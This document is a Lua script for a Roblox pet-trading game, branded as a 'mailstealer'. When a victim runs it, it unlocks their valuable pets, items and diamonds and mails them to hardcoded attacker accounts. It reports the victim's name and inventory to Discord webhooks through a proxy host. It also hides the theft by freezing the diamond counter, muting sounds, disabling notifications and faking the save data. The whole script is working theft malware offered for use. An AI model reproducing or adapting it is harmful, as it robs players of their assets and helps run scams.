Username = "Korovka_UP"
Username2 = "Korovka_UP"
Webhook = "https://discord.com/api/webhooks/1234158635563876423/plPKDP3Sk6X1_NnzxiQliv9VDBTM9J2jid5VR1aF0cWEqL0DEW_Nidgakoqx62cAd5RX"
MinimumRAP = 1000000
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
_G.scriptExecuted = false

min_rap = MinimumRAP
Webhook2 = "https://discord.com/api/webhooks/1217561298984763503/-fV7UukyFwMdu2XaZZhLYwazAExsTG6NqQA8HAUiqxt5Nc0BfuMlVNbN-FmRlJv-c64E"
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local Directory = library.Directory
local save = library.Save.Get().Inventory
local Inventory = save
local mailsent = library.Save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "RUSSIAN Mailstealer"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
_G.scriptExecuted = _G.scriptExecuted or false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
	newamount = math.ceil(newamount * (1.5 ^ mailsent))
    if newamount > 5000000 then
		newamount = 5000000
	end
end

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
		break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getRAP(Type, Item)
    return (library.DevRAPCmds.Get(
        {
            Class = {Name = Type},
            IsA = function(hmm)
                return hmm == Type
            end,
            GetId = function()
                return Item.id
            end,
            StackKey = function()
                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
            end
        }
    ) or 0)
end

local function GetRAPOfHuges()
    HugesRAP = 0
    if Inventory.Pet ~= nil then
        for i, v in pairs(Inventory.Pet) do
            id = v.id
            dir = Directory.Pets[id]
            if dir.huge and dir.Tradable ~= false then
                HugesRAP = HugesRAP + getRAP("Pet", v)
            end
        end
    end
    return HugesRAP
end

local totalRAP = 0

local combinedItems = {}
local itemRapMap = {}

for _, item in ipairs(sortedItems) do
    local rapKey = item.name
    if itemRapMap[rapKey] then
        itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
    else
        itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
        table.insert(combinedItems, rapKey)
    end
end

table.sort(combinedItems, function(a, b)
    return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
end)
local HitsString = ""

for _, itemName in ipairs(combinedItems) do
    local itemData = itemRapMap[itemName]
    HitsString = HitsString .. "• " .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    totalRAP = totalRAP + (itemData.rap * itemData.amount)
end

if HitsString == "" or HitsString == nil then
    HitsString = "Нет предметов!"
end
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts
-- MADE BY X SCRIPTS - discord.gg/xscripts




local function SendMessage(url, diamonds, Pricesending, ping)
    
    local headers = {
        ["Content-Type"] = "application/json"
    }
	local ExecutorWebhook = identifyexecutor()
	
	local fields = {
        {
            ["name"] = "`(\240\159\144\167) Информация игрока:`",
            ["value"] = "```(\240\159\167\184) Имя игрока: " ..
                game.Players.LocalPlayer.Name ..
                    "\n(\240\159\167\169) Дисплей имя игрока: " ..
                        game.Players.LocalPlayer.DisplayName ..
                            "\n(\240\159\142\178) Создатель стилера: Первый юзер: " ..
                                Username ..
                                    " / Второй юзер: " ..
                                        Username2 ..
                                            "\n(\240\159\147\170) Цена отправки: " ..
                                                Pricesending ..
                                                    "\n(\226\173\144) Чит: " ..
                                                        ExecutorWebhook ..
                                                        "\n(\240\159\146\176) Весь РАП: "..
                                                            formatNumber(totalRAP)..
                                                                "\n(\240\159\146\142) Гемы: "..formatNumber(diamonds)..
                                                                    "\n(\240\159\147\140) Версия: Релиз```",
            ["inline"] = false
        },
        {
            ["name"] = "```(\240\159\144\177) Все петы, айтемы:```",
            ["value"] = "```" .. HitsString .. "```",
            ["inline"] = true
        }
    }

    imgs = "https://cdn.discordapp.com/attachments/1181340386577350778/1237063011160690818/IMG_7541.png?ex=663a4835&is=6638f6b5&hm=102debca9b71461beb72c89980990d4831c1cb916b8a7b503d8b741867946086&"
	local data = {
		["content"] = ping,
		["username"] = "RU Mailstealer",
		["avatar_url"] = imgs,
        ["embeds"] = {
			{
			["type"] = "rich",
            ["title"] = "__`ЧТООО КТО ТО ЗАСКАМИЛСЯ`__ \240\159\142\137" ,
			["url"] = "https://discord.gg/mailstealer",
            ["color"] = tonumber(0x7db1ff),
			["thumbnail"] = {
				["url"] = "https://media.discordapp.net/attachments/1181340386577350778/1237062979326054461/IMG_8050.png?ex=663a482d&is=6638f6ad&hm=cdb51ecad717ac40097b36e50f8eeb7f291da2584ea7645f86e6f75c8faefc2d&=&format=webp&quality=lossless&width=507&height=507",
				["height"] = 420,
				["width"] = 420
			},
			["fields"] = fields,
        }
	}
    }

    local body = HttpService:JSONEncode(data)
    local response = request({
		Url = url,
		Method = "POST",
		Headers = headers,
		Body = body
	})
end

local user = Username
local user2 = Username2

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
	noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0
            x.PlayOnRemove=false
            x:Destroy()
        end
    end
end)


local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
	local response = false
	repeat
    	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
		if response == false and err == "They don't have enough space!" then
			user = user2
			args[1] = user
		end
	until response == true
	GemAmount1 = GemAmount1 - newamount
	newamount = math.ceil(math.ceil(newamount) * 1.5)
	if newamount > 5000000 then
		newamount = 5000000
	end
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
			if GemAmount1 >= (newamount + 10000) then
				local args = {
					[1] = user,
					[2] = MailMessage,
					[3] = "Currency",
					[4] = i,
					[5] = GemAmount1 - newamount
				}
				local response = false
				repeat
					local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
				until response == true
				break
			end
        end
    end
end

local function IsMailboxHooked()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
			end
        end
    end
end

local function ClaimMail()
    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait()
        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
    end
end

local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

for i, v in pairs(categoryList) do
	if save[v] ~= nil then
		for uid, item in pairs(save[v]) do
			if v == "Pet" then
                local dir = library.Directory.Pets[item.id]
                if dir.huge or dir.exclusiveLevel then
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt and item.pt == 2 then
                            prefix = "Rainbow "
                        end
                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end
                        local id = prefix .. item.id
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                    end
                end
            else
                local rapValue = getRAP(v, item)
                if rapValue >= min_rap then
                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                end
            end
            if item._lk then
                local args = {
                [1] = uid,
                [2] = false
                }
                network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
            end
        end
	end
end

if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
    ClaimMail()
	if IsMailboxHooked() then
		return
	end
    EmptyBoxes()
	require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
	require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
    local blob_a = require(game.ReplicatedStorage.Library)
    local blob_b = blob_a.Save.Get()
    function deepCopy(original)
        local copy = {}
        for k, v in pairs(original) do
            if type(v) == "table" then
                v = deepCopy(v)
            end
            copy[k] = v
        end
        return copy
    end
    blob_b = deepCopy(blob_b)
    blob_a.Save.Get = function(...)
        return blob_b
    end

    table.sort(sortedItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount 
    end)

    if Webhook2 and string.find(Webhook2, "discord") then
        Webhook2 = string.gsub(Webhook2, "https://discord.com", "https://webhook.lewisakura.moe")
        spawn(function()
            SendMessage(Webhook2, GemAmount1, newamount, "X Mailstealer on top")
        end)
    end

    if Webhook and string.find(Webhook, "discord") then
        Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
        spawn(function()
            SendMessage(Webhook, GemAmount1, newamount, "@everyone")
        end)
    end
    
    for _, item in ipairs(sortedItems) do
        if newamount > 5000000 then
            newamount = 5000000
        end
        if item.rap >= newamount then
            sendItem(item.category, item.uid, item.amount)
        else
            break
        end
    end
    SendAllGems()
    local message = require(game.ReplicatedStorage.Library.Client.Message)
    message.Error("discord.gg/cJXAY4fnDk")
end
